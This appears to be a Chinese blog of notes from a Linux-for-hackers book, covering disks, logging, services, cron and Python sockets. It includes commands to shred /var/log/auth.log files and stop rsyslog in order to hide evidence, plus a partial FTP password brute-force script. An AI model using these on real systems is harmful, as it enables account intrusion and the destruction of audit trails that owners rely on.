<p>设备 sda1、sda2 和 sda5 在第一节中列出。这三种设备构成了我的虚拟机的虚拟磁 盘，它是一个 20GB 的驱动器，有三个分区，包括交换分区(sda5)，当 RAM 容量超过时，它充当虚拟 RAM —类似于 Windows 中的虚拟页面文件。<br>向下扫描到第三节，您将看到指定为 sdb -的第二个设备输出，b 标签告诉我们这个驱 动器与前三个设备是分开的。这是我的 64GB 闪存。注意，fdisk 表示它是 HPFS/NTFS/ExFAT 文件系统类型。 这些文件类型——高性能文件系统(HPFS)、新技术文件系统(NTFS)和扩展文件分配表(exFAT)——不是 Linux 系统的本机文件，而是 macOS 和 Windows 系统的。在进行研究时，能够识别不同系统的原生文件类型是值 得的。文件系统可能指出驱动器的格式设置在哪种机器上，这是有价值的信息。Kali 能够使用在许多不同操 作系统上创建的 USB 闪存驱动器。<br>正如您在第 1 章中看到的，Linux 文件系统的结构与 Windows 和其他专有操作系统有很大的不同。最重 要的是，Linux 中文件的存储和管理方式也不同。新版本的 Windows 使用 NTFS 文件系统，而旧的 Windows<br>109<br>系统使用文件分配表(FAT)系统。<br>Linux 使用许多不同类型的文件系统，但最常见的是 ext2、ext3 和 ext4。这些都是 ext(或扩展的)文件系 统的升级版，ext4 是最新的。 </p>
<h3 id="字符和块设备"><a href="#字符和块设备" class="headerlink" title="字符和块设备"></a>字符和块设备</h3><p>关于/dev 目录中设备文件的命名，还需要注意的是，第一个位置包含 c 或 b。您可以在清单 10-1 的大 多数条目开头看到这一点，它看起来像这样: </p>
<p>这些字母代表设备输入和输出数据的两种方式。c 代表字符，如您所料，这些设备被称为字符设备。通 过逐个字符(如鼠标或键盘)发送和接收数据与系统交互的外部设备是字符设备。 </p>
<p>b 代表第二种类型:块设备。它们以数据块(一次多个字节)进行通信，包括硬盘驱动器和 DVD 驱动器等 设备。这些设备需要更高的数据吞吐量，因此以块(一次多个字符或字节)的形式发送和接收数据。一旦您知 道一个设备是字符设备还是块设备，您就可以轻松地获得关于它的更多信息。</p>
<h3 id="使用-lsblk列出-块设备和信息"><a href="#使用-lsblk列出-块设备和信息" class="headerlink" title="使用 lsblk列出 块设备和信息"></a>使用 lsblk列出 块设备和信息</h3><p>Linux 命令 lsblk (list block 的缩写)列出/dev 中列出的每个块设备的一些基本信息。结果类似于 fdisk -l 的输出，但它也将在一种树型结构中显示具有多个分区的设备，将每个设备的分区显示为分支，并且不需 要运行根特权。例如，在清单 10-3 中，我们看到了 sda 及其分支 sda1、sda2 和 sda5。 </p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;lsblk </span><br><span class="line">Name MAJ:MIN RM SIZE RO TYPE MOUNTPOINT </span><br><span class="line">fd0 2:0<span class="number"> 1 </span>4K<span class="number"> 0 </span>disk </span><br><span class="line">sda1 8:0<span class="number"> 0 </span>20G<span class="number"> 0 </span>disk </span><br><span class="line">|-sda1 8:1<span class="number"> 0 </span>18.7G<span class="number"> 0 </span>part / </span><br><span class="line">|-sda2 8:2<span class="number"> 0 </span>1K<span class="number"> 0 </span>part </span><br><span class="line">|-sda5 8:5<span class="number"> 0 </span>1.3G<span class="number"> 0 </span>part [SWAP] </span><br><span class="line"></span><br><span class="line">sdb 8:16<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk </span><br><span class="line">|-sdb1 8.17<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk /media </span><br><span class="line">sr0 11:0<span class="number"> 1 </span>2.7G<span class="number"> 0 </span>rom</span><br></pre></td></tr></table></figure>

<p>输出包括软盘驱动器作为 fd0, DVD 驱动器作为 sr0，尽管我的系统上没有软盘驱动器，这只是旧系统的 遗留。我们还可以在驱动器的挂载点上看到信息——这是驱动器附加到文件系统的位置。请注意，硬盘驱 动器 sda1 安装在/目录和闪存驱动器安装在/media 目录。</p>
<h3 id="自己安装存储设备"><a href="#自己安装存储设备" class="headerlink" title="自己安装存储设备"></a>自己安装存储设备</h3><p>mount  /dev/sdb1  /mnt         将新硬盘 sdb1 挂载到/mnt 目录</p>
<h3 id="卸载与-umount"><a href="#卸载与-umount" class="headerlink" title="卸载与 umount"></a>卸载与 umount</h3><p>umount  /dev/sdb1 </p>
<h3 id="获取挂载磁盘上的信息"><a href="#获取挂载磁盘上的信息" class="headerlink" title="获取挂载磁盘上的信息"></a>获取挂载磁盘上的信息</h3><p>命令 df(对于空余磁盘)将为我们提供关于任何硬盘或挂载设备(如 CD、DVD 和闪存驱动器)的基本信息， 包括正在使用的空间和可用空间(参见清单 10-4)。如果没有任何选项，df 默认为系统上的第一个驱动器(在 本例中是 sda)。如果您想检查另一个驱动器，只需使用您想检查的驱动器表示形式(例如，df sdb)遵循 df 命 令即可。 </p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;df  </span><br><span class="line">Filesystem <span class="number">1</span>K-Blocks Used Available Use% Mounted on </span><br><span class="line">rootfs <span class="number">19620732</span>    <span class="number">17096196</span> <span class="number">1504788</span> <span class="number">92</span>% / </span><br><span class="line">udev  <span class="number">10240</span> <span class="number">0</span> <span class="number">10240</span>   <span class="number">0</span>% /dev  </span><br><span class="line">­­snip--   </span><br><span class="line"> </span><br><span class="line">/dev/sdb1 <span class="number">29823024</span>  <span class="number">29712544</span> <span class="number">110480</span>  <span class="number">99</span>% /media/USB3<span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>这里的第一行输出我们得到的信息显示类别标题，磁盘空间以 1KB 块的形式给出。在第二行，我们看 到 rootfs 有 19,620,732 个 1 千字节的块，其中使用了 17,096,196 个块(约占 92%)，剩下 1,504,788 个可用。 df 命令还告诉我们这个文件系统安装在文件系统/根目录。<br>在最后一行，你可以看到我的 u 盘。注意，它被指定为/dev/sdb1，几乎 100%已满，挂载在/media/USB3.0。<br>综上所述，我在这个系统上的虚拟磁盘被指定为 sda1，它的信息如下:<br>sd SATA 硬盘<br>一个硬盘驱动器<br>驱动器上的第一个分区 </p>
<p>我的 64GB 闪存驱动器指定为 sdb1，我的外部驱动器指定为 sdc1</p>
<h3 id="检查错误"><a href="#检查错误" class="headerlink" title="检查错误"></a>检查错误</h3><p>fsck 命令(文件系统检查的缩写)检查文件系统的错误并修复损坏(如果可能的话)，或者将错误区域放入 一个错误块表中，将其标记为错误。要运行 fsck 命令，需要指定文件系统类型(默认为 ext2)和要检查的设 备文件。重要的是，在运行文件系统检查之前，必须卸载驱动器。</p>
<p>因此，执行文件系统检查的第一步是卸载设备。</p>
<p>kali &gt;umount  /dev/sdb1 </p>
<p>我可以添加-p 选项，让 fsck 自动修复</p>
<p>kali &gt;fsck  -p  /dev/sdb1 </p>
<p>在设备卸载后，我现在可以检查设备的任何坏扇区或其他问题，如下: </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fsck  -p  /dev/sdb1  </span><br><span class="line">fsck <span class="keyword">from</span> util-linux 2.30.2  </span><br><span class="line">exfatfsck 1.2.7 </span><br><span class="line">Checking file<span class="built_in"> system </span>on /dev/sdb1.  </span><br><span class="line">File<span class="built_in"> system </span>version 1.0 </span><br><span class="line">Sector size 512 bytes </span><br><span class="line">Cluster size 32 KB </span><br><span class="line">Volume size 7648 MB </span><br><span class="line">Used space 1265 MB </span><br><span class="line">Available space 6383 MB  </span><br><span class="line">Totally 20 directories <span class="keyword">and</span> 111 files. </span><br><span class="line">File<span class="built_in"> system </span>checking finished. <span class="literal">No</span> errors found.</span><br></pre></td></tr></table></figure>



<h2 id="日志系统"><a href="#日志系统" class="headerlink" title="日志系统"></a>日志系统</h2><p>Linux 使用一个名为 syslogd 的守护进程来自动记录计算机上的事件。syslog 的几个变体，包括 rsyslog 和 syslog-ng</p>
<h3 id="rsyslog日志记录规则"><a href="#rsyslog日志记录规则" class="headerlink" title="rsyslog日志记录规则"></a>rsyslog日志记录规则</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">###############  </span><br><span class="line">#### RULES ####  </span><br><span class="line">###############  </span><br><span class="line"># </span><br><span class="line"><span class="number">117</span> </span><br><span class="line"># First some standard log files. Log by facility.  </span><br><span class="line"># </span><br><span class="line">auth,authpriv.* /var/log/auth.log </span><br><span class="line">*.*;auth,authpriv.none -/var/log/syslog  </span><br><span class="line">#cron.* /var/log/cron.log </span><br><span class="line">daemon.*  -/var/log/daemon.log  </span><br><span class="line">kern.* -/var/log/kern.log </span><br><span class="line"><span class="number">1</span>pr.* -/var/log/lpr.log </span><br><span class="line">mail.* -/var/log/mail.log </span><br><span class="line">user.* -/var/log/user.log </span><br><span class="line"> </span><br><span class="line"># </span><br><span class="line"># Logging for the mail <span class="keyword">system</span>. Split it up so that  </span><br><span class="line"># it is easy to write scripts to parse these files. </span><br><span class="line"># </span><br><span class="line">mail.info -/var/log/mail.info </span><br><span class="line">mail.warn -/var/log/mail.warn </span><br><span class="line">mail.err /var/log/mail.err</span><br></pre></td></tr></table></figure>

<p>每一行都是一个单独的日志记录规则，说明记录了哪些消息以及记录到哪里。这些规则的基本格式如<br>下: </p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">facility.<span class="built_in">priority</span> <span class="built_in">action</span></span><br></pre></td></tr></table></figure>

<p> facility 关键字引用正在记录其消息的程序，例如邮件、内核或打印系统。priority 关键字决定为该程序 记录哪种类型的消息。在最右边的 action 关键字引用将发送日志的位置。让我们更仔细地看一下每个部分， 首先是 facility 关键字，它指的是生成日志的任何软件，无论是内核、邮件系统还是用户。 </p>
<p>下面是一个有效的代码列表，可以用来代替我们的配置文件规则中的关键字 facility:<br>auth/authpriv 安全/授权消息<br>cron 时钟守护进程<br>daemon 其他守护进程<br>kern 内核消息<br>118<br>lpr 打印系统<br>mail 邮件系统<br>user 常规用户级别消息 </p>
<p>星号通配符（*）代替单词指的是所有信息。 您可以通过以逗号分隔的列表来选择多个。<br>优先级告诉系统要记录哪种消息。代码从最低优先级列出，从调试开始到最高优先级，以严重结束。 如果优先级为*，则记录所有优先级的消息。指定优先级时，将记录该优先级及更高优先级的消息。例如， 如果指定的优先级代码为告警 alert，系统将记录分类为告警和更高优先级的消息，但不会记录标记为 crit 的消息或低于警报的任何优先级。以下是有效优先级代码的完整列表： </p>
<p>• debug </p>
<p>• info </p>
<p>• notice</p>
<p>• warning </p>
<p>• warn </p>
<p>• error </p>
<p>• err </p>
<p>• crit </p>
<p>• alert </p>
<p>• emerg </p>
<p>• panic<br>warning、warn、error、err、emerg、panic，这些都已被弃用，不应该使用。 </p>
<p>操作通常是一个文件名和应该发送日志的位置。注意，通常，日志文件被发送到/var/log 目录，其文件 名描述为生成它们的工具，如 auth。这意味着，例如，由 auth 工具生成的日志将被发送到/var/log.auth.log。<br>让我们看一些日志规则的例子: </p>
<p>mail.* /var/log/mail<br>这个示例将所有(*)优先级的邮件事件记录到/var/log/mail 文件中。 </p>
<p>kern.crit /var/log/kernel<br>这个例子将把危险(crit)优先级或更高的内核事件记录到/var/log/kernel 中。 </p>
<p>*.emerg *<br>最后一个示例将记录所有登录用户的紧急事件(emerg)优先级的所有事件。</p>
<p>通过这些规则，黑客可以确 定日志文件的位置、更改优先级，甚至禁用特定的日志规则。 </p>
<h3 id="使用-LOGROTATE-自动清理日志"><a href="#使用-LOGROTATE-自动清理日志" class="headerlink" title="使用 LOGROTATE 自动清理日志"></a>使用 LOGROTATE 自动清理日志</h3><p>/etc/logrotate.conf </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># see <span class="string">"man logrotate"</span> <span class="keyword">for</span> details  </span><br><span class="line"># <span class="keyword">rotate</span> <span class="keyword">log</span> files weekly </span><br><span class="line">➊ weekly </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">keep</span> 4 weeks worth of backlogs </span><br><span class="line">➋ <span class="keyword">rotate</span> 4 </span><br><span class="line"> </span><br><span class="line">➌ # create new (empty) <span class="keyword">log</span> files after rotating old ones  </span><br><span class="line">create </span><br><span class="line"> </span><br><span class="line">➍ # uncomment this <span class="keyword">if</span> you want your <span class="keyword">log</span> files compressed  </span><br><span class="line">#<span class="keyword">compress</span> </span><br><span class="line"> </span><br><span class="line"># packages <span class="keyword">drop</span> <span class="keyword">log</span> rotation information into this directory  </span><br><span class="line"><span class="keyword">include</span> /etc/logrotate.<span class="keyword">d</span> </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">no</span> packages own wtmp, or btmp -- we'll <span class="keyword">rotate</span> them here </span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp  </span><br><span class="line"> &#123;   missingok  </span><br><span class="line"> monthly </span><br><span class="line"> create 0664 root utmp  </span><br><span class="line">120 </span><br><span class="line"> <span class="keyword">rotate</span> 1 </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>第一，你可以设置的时间单位数字参考➊。这里的默认值是 weekly，这意味着 rotate 关键字之后的任 何数字总是指 weeks（周） 。<br>进一步往下看，你可以看到设置切割转储日志默认设置的频率是每四个星期转储日志➋。这个默认配 置对大多数人都适用，但是如果您想让您的日志更长一些，以便进行调查，或者更短一些，以便更快地清 除它们，那么您应该更改这个设置。例如，如果您每周检查日志文件并希望节省存储空间，可以将此设置 更改为 rotate 1。如果您的日志有足够的存储空间，并且希望保留半永久记录以便以后进行取证分析，那么 您可以将此设置更改为 rotate 26 以保存六个月的日志，或者将 rotate 52 更改为保存一年的日志。<br>默认情况下，创建一个新的空日志文件当做旧日志的切割备份➌。在配置文件中建议，你也可以选择 压缩转储的日志文件➍。 </p>
<p>在每个转储周期结束时，将重命名日志文件，并在创建新日志文件时将其推到日志链的末尾，以替换 当前日志文件。例如，/var/log.auth 将变成/var/log.auth.1，那么/var/log.auth.2，以此类推。如果您每四周 轮换一次日志，并保留四组备份，那么您将得到/var/log.auth.4，但是没有/var/log.auth.5。意思是旧的 /var/log.auth.4 将被删除，而不是被推到/var/log/auth.5</p>
<h3 id="删除证据"><a href="#删除证据" class="headerlink" title="删除证据"></a>删除证据</h3><p>shred 将删除文件并多次覆盖它——默认情况下，shred 将覆盖 4 次。通常，文件被 覆盖的次数越多，恢复起来就越困难，但是请记住，每次覆盖都需要时间，因此对于非常大的文件，碎片 化可能会很耗时。 </p>
<p>要包括两个有用的选项，一个是-f 选项，它更改文件的权限，以便在需要更改权限时允许覆盖；另一 个是-n 选项，它允许您选择覆盖文件的次数。</p>
<p>例如，我们将使用以下命令将/var/log/auth.log 中的日志文件 分解覆盖 10 次: </p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;shred  -f  -<span class="built_in">n</span>  <span class="number">10</span>  /<span class="built_in">var</span>/<span class="built_in">log</span>/auth.log.*</span><br></pre></td></tr></table></figure>

<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><p>需要root权限</p>
<p>service  rsyslog  stop </p>
<h2 id="熟练使用服务"><a href="#熟练使用服务" class="headerlink" title="熟练使用服务"></a>熟练使用服务</h2><p>启动、停止和重新启动服务 </p>
<p>service servicename start|stop|restart </p>
<p>对黑客特别重要的四个：</p>
<p><strong>Apache Web Server，</strong></p>
<p><strong>OpenSSH，</strong></p>
<p><strong>MySQL ，</strong></p>
<p><strong>PostgreSQL 结合 Metasploit  。</strong> </p>
<h2 id="使用作业调度自动化任务"><a href="#使用作业调度自动化任务" class="headerlink" title="使用作业调度自动化任务"></a>使用作业调度自动化任务</h2><p>需要遵循的格式，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M   H  DOM  MON  DOW <span class="built_in"> USER </span> COMMAND </span><br><span class="line">30  2  * *   1-5  root  /root/myscanningscript</span><br></pre></td></tr></table></figure>

<p>leafpad  /etc/crontab </p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab </span></span><br><span class="line"><span class="comment"># Unlike any other crontab, you don't have to run the 'crontab'  </span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file </span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,  </span></span><br><span class="line"><span class="comment"># which no other crontabs do. </span></span><br><span class="line"> </span><br><span class="line">SHELL=<span class="regexp">/bin/sh</span> PATH=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># m h dom mon dow user command </span></span><br><span class="line"><span class="number">17</span> * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line"><span class="number">25</span> <span class="number">6</span> * * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">47</span> <span class="number">6</span> * * <span class="number">7</span> root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">52</span> <span class="number">6</span> <span class="number">1</span> * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="设置一个备份计划任务"><a href="#设置一个备份计划任务" class="headerlink" title="设置一个备份计划任务"></a>设置一个备份计划任务</h3><p>在 crontab 中添加下行： </p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">2</span> * * <span class="number">0</span> backup /bin/systembackup.sh</span><br></pre></td></tr></table></figure>

<p>cron 守护进程将在每月周日早上 2 点执行那个脚本。  </p>
<h3 id="crontab快捷方式"><a href="#crontab快捷方式" class="headerlink" title="crontab快捷方式"></a>crontab快捷方式</h3><p>crontab 文件有些内置的快捷方式，用来代替具体的时间，日期，月份。它包含这些：<br>179<br>• @yearly </p>
<p>• @annually </p>
<p>• @monthly </p>
<p>• @weekly </p>
<p>• @daily </p>
<p>• @midnight </p>
<p>• @noon </p>
<p>• @reboot<br>所以，如果你希望 MySQL 扫描器每天午夜运行，你可以添加下行到 crontab 文件： </p>
<p>@midnight user /usr/share/MySQLsscanner.sh </p>
<h3 id="使用-RC-脚本开机运行任务"><a href="#使用-RC-脚本开机运行任务" class="headerlink" title="使用 RC 脚本开机运行任务"></a>使用 RC 脚本开机运行任务</h3><p>Linux运行级别</p>
<p>Linux 有多个运行级别，用于指示启动时需要启动哪些服务。例如，运行级别 1 是单用户工作状态， rc 脚本会根据运行级别运行。 </p>
<p>0 系统停机状态<br>1 单用户工作状态<br>2 – 5 多用户状态<br>6 重启 </p>
<p>你以使用 update-rc.d 命令为 rc.d 脚本添加启动时要运行的服务。此命令允许你从 rc.d 脚本中添加或删 除服务。update-rc.d 的语法很简单，输入命令，后面输入脚本的名字然后输入动作</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;update-rc.d  &lt;name  of  the <span class="built_in"> script </span> <span class="keyword">or</span>  service&gt;  &lt;remove|defaults|disable|enable&gt;</span><br></pre></td></tr></table></figure>

<p>举个update-rc.d的例子，假设你总是希望PostgreSQL 数据库在系统启动时运行，这样你的Metasploit 框 架可以使用它储存黑客攻击和渗透测试的结果。你需要使用 update-rc.d 添一行到你的 rc.d 脚本来让它每次 系统启动时运行。 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span>-rc.d  postgresql  <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure>

<h2 id="PYTHON-网络通信"><a href="#PYTHON-网络通信" class="headerlink" title="PYTHON 网络通信"></a>PYTHON 网络通信</h2><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/python3 </span></span><br><span class="line">➊ <span class="keyword">import</span> socket </span><br><span class="line">➋ s = socket.socket() </span><br><span class="line">➌ s.connect((<span class="string">"192.168.1.101"</span>, <span class="number">22</span>)) </span><br><span class="line">➍ answer = s.recv(<span class="number">1024</span>) </span><br><span class="line">➎ print(answer)</span><br></pre></td></tr></table></figure>

<p>首先，我们导入 socket 模块➊，以便使用它的功能和工具。这里，我们将使用 socket 模块中的网络工 具来为我们处理通过网络连接的接口。Socket 为两个计算机节点提供了相互通信的方式。通常一个节点是服 务端一个是客户端。<br>然后我们创建了一个新的变量 s ，然后将它和 socket 模块中的 socket 类关联➋。这样，每当我们想使 用 socket 类时，就不必引用完整的 socket.socket（）语法，只需使用 s 变量名即可。<br>然后，我们使用 socket 模块➌中的 connect（）方法来建立到特定 IP 和端口的网络连接。记住，方法是 可用于特定对象的函数，语法为 object.method（例如 socket.connect）。这里，我连接到 IP 地址 192.168.1.101， 它是我网络上一台电脑的 IP 地址，22 端口是默认的 ssh 端口。您可以在 Linux 或 Kali 的另一个实例上对此 进行测试。大多数 22 端口是默认打开。<br>一旦你建立了联系，就可以做很多事情。这里我们使用接收方法 recv 来接收来自 socket 的 1024 bytes 数据 ➍ 并且将他们储存到一个叫 answer 的变量里；这 1024 bytes 包含了 banner 信息。然后，我们用 print （）函数将该变量的内容打印到屏幕上，以查看通过该 socket 传递的数据，从而允许我们监视它！在最后 一行，我们关闭连接。 </p>
<h3 id="创建-TCP-监听器"><a href="#创建-TCP-监听器" class="headerlink" title="创建 TCP 监听器"></a>创建 TCP 监听器</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/<span class="keyword">bin/python3 </span><span class="meta">import</span> socket </span><br><span class="line">➊ TCP_IP = <span class="string">"192.168.181.190"</span> TCP_PORT = <span class="number">6996</span> </span><br><span class="line"><span class="keyword">BUFFER_SIZE </span>= <span class="number">100</span> </span><br><span class="line"> </span><br><span class="line">➋ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">➌ s.<span class="keyword">bind((TCP_IP, </span>TCP_PORT)) </span><br><span class="line">➍ s.listen (<span class="number">1</span>) </span><br><span class="line"> </span><br><span class="line">➎ conn,<span class="keyword">addr </span>= s.accept() </span><br><span class="line"> print (<span class="string">'Connection address: '</span>, <span class="keyword">addr </span>)  </span><br><span class="line"> <span class="meta">while</span> <span class="number">1</span>: </span><br><span class="line">		<span class="meta">data</span><span class="symbol">=conn</span>.recv(<span class="keyword">BUFFER_SIZE) </span></span><br><span class="line">		<span class="meta">if</span> not <span class="meta">data</span>:</span><br><span class="line">			<span class="keyword">break </span></span><br><span class="line">		print (<span class="string">"Received data: "</span>, <span class="meta">data</span>)  </span><br><span class="line"> 	 	conn.send(<span class="meta">data</span>) <span class="symbol">#echo</span> </span><br><span class="line"> </span><br><span class="line"><span class="symbol">conn.close</span></span><br></pre></td></tr></table></figure>

<p>我们声明希望脚本使用 Python 解释器运行，然后像以前一样导入套接字模块，这样我们就可以使用它 的功能。然后，我们定义变量来保存 TCP/IP 地址、要监听的端口以及要从连接系统捕获的数据的缓冲区大 小的信息➊。<br>我们定义了 socket ➋，并使用刚才创建的变量将 socket 绑定到 IP 地址和端口➌。我们告诉 socket 使用 socket 库➍中的 listen()方法进行侦听。<br>然后，我们使用 socket 库的 accept 方法捕获连接系统的 IP 地址和端口，并将这些信息打印到屏幕上，<br>以便用户可以看到它➎。</p>
<p>现在，转到网络上的另一台计算机，使用浏览器连接到脚本中指定的 6996 端口。运行 tcp_server.py 脚 本，你应该能够连接和收集有关那个系统的关键信息，包括连接系统的 IP 地址和端口，如下所示： </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;./tcp_server.py </span><br><span class="line">Connection <span class="string">Address:</span> (<span class="string">'192.168.181.190'</span>, <span class="number">45368</span>) Received <span class="string">data:</span> Get <span class="regexp">/HTTP/</span><span class="number">1.1</span> </span><br><span class="line"><span class="string">Host:</span><span class="number">192.168</span><span class="number">.181</span><span class="number">.190</span>:<span class="number">6996</span> </span><br><span class="line">User ­<span class="string">Agent:</span>Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; <span class="string">rv:</span><span class="number">45.0</span>) Gec </span><br><span class="line"></span><br><span class="line">­­snip---</span><br></pre></td></tr></table></figure>

<p>这是黑客在决定攻击前收集的关键信息。漏洞攻击（或黑客攻击）是针对特定的操作系统、应用程序， 甚至是正在使用的语言，因此黑客需要在继续操作之前尽可能了解有关目标的信息。在黑客攻击之前收集信息的行为通常被称为侦察。</p>
<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>这个脚本要求用户输入 ftp 服务器 号和要破解的 ftp 帐户的用户名。然后它读取一个包含可能密码列表的外部文本文件，并尝试每个密码来破 解 ftp 帐户。脚本执行此操作直到成功或密码用完。 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3 </span></span><br><span class="line">import ftplib </span><br><span class="line">➊<span class="built_in"> server </span>= input(FTP Server: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➋ user = input("</span>username: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➌ Passwordlist = input ("</span>Path <span class="keyword">to</span> Password List &gt; <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➍ try: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">	with open(Passwordlist, 'r') as pw:  </span></span><br><span class="line"><span class="string">	for word in pw: </span></span><br><span class="line"><span class="string">➎ 		word = word.strip ('\r').strip('\n') </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➏ 		try: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">			ftp = ftplib.FTP(server)  </span></span><br><span class="line"><span class="string">			ftp.login(user, word) </span></span><br><span class="line"><span class="string">➐			print (Success! The password is ' + word) </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➑ 		except: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">			print('still trying...') </span></span><br><span 